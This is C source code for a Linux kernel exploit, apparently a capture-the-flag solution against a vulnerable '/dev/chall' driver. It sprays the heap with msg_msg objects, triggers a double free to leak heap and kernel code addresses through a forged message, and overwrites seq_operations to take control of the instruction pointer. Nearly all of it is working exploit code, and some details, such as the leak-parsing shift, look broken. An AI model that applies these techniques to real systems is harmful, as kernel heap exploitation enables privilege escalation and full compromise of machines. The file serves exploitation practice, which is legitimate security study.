#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <unistd.h>

#define log(...) printf(__VA_ARGS__)
#define adddata 0x1337
#define readdata 0x1338
#define deldata 0x1339

#define DATASIZE 0x80
#define HEADER 0x10
#define MSG_COPY 040000

typedef long long ull;
typedef struct
{
    unsigned char size;
    unsigned int idx;
    char* ptr;
}req;

/* one msg_msg structure for each message */
typedef struct {
	// struct list_head m_list;
    void *prev;
    void *next;
	long m_type;
	size_t m_ts;		/* message text size */
	// struct msg_msgseg *next;
    void *nextMsg;
	void *security;
	/* the actual message follows immediately */
}msg_msg;

int fd = 0;

void add(char* buf){
    req curr;
    int ret = 0;
    curr.ptr = buf;

    ret = ioctl(fd, adddata, &curr);
    if(ret<0){
        log("ioctl add %d\n", ret);
        return;
    }
}

void del(unsigned int idx){
    req curr;
    int ret = 0;
    curr.idx = idx;

    ret = ioctl(fd, deldata, &curr);
    if(ret<0){
        log("ioctl del %d\n", ret);
        return;
    }
}

void view(unsigned int idx, char size, char* buf){
    req curr;
    int ret = 0;
    curr.size = size;
    curr.ptr = buf;
    curr.idx = idx;

    ret = ioctl(fd, readdata, &curr);
    if(ret<0){
        log("ioctl view %d\n", ret);
        return;
    }
}

void send_msg(int qid, int size, int c)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = 1;
    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
    {
        log("msgsnd");
        exit(-1);
    }
}

char *recv_msg(int qid, size_t size)
{
    char*  out = malloc(size);
    if (msgrcv(qid, out, size, 0, IPC_NOWAIT | MSG_NOERROR) < 0 )
    {
        log("msgrcv");
        return NULL;
    }
    return out;
}

ull parseLeak(char* ptr){
    ull tmp = 0;
    ull leak = 0;
    for(int i=0; i<8; i++){
        tmp = (unsigned char)ptr[i];
        leak = leak | (tmp << ((i-16)*8));
    }
    return leak;
}

int main(){
    char inBuf[DATASIZE+HEADER];
    char outBuf[DATASIZE+HEADER];
    ull heapLeak = 0;
    int qid0 = 0;
    int qid1 = 0;
    int qid2 = 0;
    int qid3 = 0;
    memset(inBuf, 'b', DATASIZE+HEADER);
    memset(inBuf+DATASIZE, '\x00', 0x8);
    fd = open("/dev/chall", O_RDONLY);
    if(fd<0){
        log("open");
        return -1;
    }
    // Clear partial freelist
    qid0 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    qid3 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(qid0<0 || qid3<0){
        log("msgget");
        return -1;
    }
    for(int i=0; i<0xc0; i++)
        send_msg(qid0, DATASIZE, 'p');
    for(int i=0; i<0x25; i++)
        send_msg(qid3, DATASIZE, 'p');

    // Clear 0x20 chunk freelist
    for(int i=0; i<0xe2; i++)
        open("/proc/self/stat", O_RDONLY);

    // Heap spray using msg_msg
    qid1 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(qid1<0){
        log("msgget");
        return -1;
    }
    
    // Add some msg_msg
    for(int i=0; i<0x10; i++)
        send_msg(qid1, DATASIZE, 'a');

    for(int i=0; i<0x20; i++)
        open("/proc/self/stat", O_RDONLY);

    // Now add our chunk
    add(inBuf);   // 0
    // Chunk used for next pointer setting to leak
    add(inBuf);   // 1
    //Add more msg_msg. Our chunk should be in between
    for(int i=0; i<0x10; i++)
        send_msg(qid1, DATASIZE, 'c');

    for(int i=0; i<0x45; i++){
        memset(inBuf, (char)(i+2), DATASIZE+HEADER);
        memset(inBuf+DATASIZE, '\x00', 0x8);
        add(inBuf);   // 2 to 0x47
    }
    // Set next pointer to be leaked
    del(1);
    // Trigger bug to free msg_msg next to our chunk
    view(0, 0x80, (char*)-1);
    view(0, 0x80, outBuf);
    del(0);

    char* ptr = NULL;
    // Later used to clear freelist
    int count = -1;
    for(int i=0; i<0x1f; i++){
        ptr = recv_msg(qid1, DATASIZE) + 8;
        // Leak position is always 16 to 23
        if(ptr[23]=='\xff'){
            printf("Leaked msg found at %d\n", i);
            count = i;
            break;
        }
    }
    if(count==-1){
        log("Leaking failed");
        exit(0);
    }

    heapLeak = parseLeak(ptr+16);
    printf("Heap leak @ %p\n", (void*)heapLeak);
    // Item address with seq_operations below it
    ull target = heapLeak - 0xfc0; //+ 0x1c00;//- 0x177f80+0x920; 0x6600;//
    printf("Target address @ %p\n", (void*)target);

    // New queue so msg_msg is in the head
    // msg_msg using the double free
    qid2 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(qid2<0){
        log("msgget");
        return -1;
    }

    // Exhaust current slab so previous freelist come at head 
    for(int i=0; i<25; i++)
        send_msg(qid1, DATASIZE, 'd');

    // This will go into the msg_msg that gave leak
    send_msg(qid2, DATASIZE, '\x00');

    // Allocate `count` number of chunks to clear up freelist
    // Queue 1 used as junk queue
    for(int i=0; i<count; i++)
       send_msg(qid1, DATASIZE, 'a');

    //Fake msg_msg
    msg_msg *fakeMsg = malloc(sizeof(msg_msg));
    fakeMsg->next = (char*)heapLeak;
    fakeMsg->prev = (char*)heapLeak;
    fakeMsg->m_type = 0;
    fakeMsg->m_ts = 0x2000;
    fakeMsg->security = NULL;
    fakeMsg->nextMsg = (char*)target;
    // Allocation on the msg_msg of queue 2's chunk
    add((char*)fakeMsg);    // 0
    ull codeLeak = 0;
    char* codePtr = recv_msg(qid2, 0x2000);
    for(int i=0; i<0x2008; i+=8){
        // Sometimes -1 can be there in memory
        if(codePtr[4]=='\xff' && codePtr[5]=='\xff' 
        && codePtr[6]=='\xff' && codePtr[7]=='\xff'
        && codePtr[0]!='\xff' && codePtr[1]!='\xff'
        && codePtr[2]!='\xff' && codePtr[3]!='\xff'){
            log("Found code leak at position ptr + %d\n", i);
            codeLeak = parseLeak(codePtr);
            break;
        }
        codePtr = codePtr + i;
    }
    printf("Kernel Code leak @ %p\n", (void*)codeLeak);

    // Free all chunks. Double free in 0x20 chunk
    for(int i=0; i<0x45; i++){
        del(i+2);
    }

    int fds[0x45] = {0};
    // Get all 0x20 chunks back
    for(int i=0; i<0x45; i++)
        fds[i] = open("/proc/self/stat", O_RDONLY);

    char payload[DATASIZE+HEADER];
    // 8 bytes at payload + DATASIZE will be the rip
    memset(payload, '?', DATASIZE+HEADER);
    // Overwrite seq_operations
    add(payload);
    // One of these have `start` overwritten
    // rip control here
    for(int i=0; i<0x45; i++)
        read(fds[i], inBuf, 0x50);
}